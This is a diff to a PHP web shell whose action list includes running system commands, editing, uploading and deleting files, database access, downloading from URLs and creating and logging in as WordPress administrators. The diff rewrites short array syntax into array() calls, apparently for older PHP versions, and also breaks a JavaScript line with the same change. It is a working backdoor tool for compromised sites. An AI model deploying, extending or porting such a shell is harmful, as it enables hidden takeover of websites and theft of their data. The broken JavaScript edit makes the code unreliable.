@@ -19,12 +19,12 @@ $safeMode = true;
 $actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_stl_folder','create_shb_file', 'download_from_url', 'chmod','chmod_folder','goto');
 $ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";
 function listDrives() {
-    $drives = [];
+    $drives = array();
 
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
         $output = shell_exec("wmic logicaldisk get name 2>&1");
         preg_match_all('/[A-Z]:/', $output, $matches);
-        $drives = $matches[0] ?? [];
+        $drives = isset($matches[0]) ? $matches[0] : array();
     }
     return array_values($drives);
 }
@@ -47,12 +47,12 @@ if (!function_exists('curl_data')) {
 			$data = curl_exec($ch);
 			curl_close($ch);
 		} else {
-			$context = stream_context_create([
-				'ssl' => [
+			$context = stream_context_create(array(
+				'ssl' => array(
 					'verify_peer' => false,
 					'verify_peer_name' => false,
-				]
-			]);
+				)
+			));
 			$data = file_get_contents($url, false, $context);
 		}
 		return $data;
@@ -166,7 +166,7 @@ function rrmdir($dir)
 }
 function normalise_path($path)
 {
-    return str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $path);
+    return str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, $path);
 }
 
 $default_dir = getcwd();
@@ -1243,7 +1243,7 @@ function silPapka(qovluq)
 function shifrelee()
 {
 	var vall = document.getElementsByClassName('file_edit')[0].value;
-	var repp = ['a','i','e','s','l','b','u','o','p','h',"\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$"];
+	var repp = array('a','i','e','s','l','b','u','o','p','h',"\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$");
 	for(var s in repp)
 	{
 		var h = repp[s];
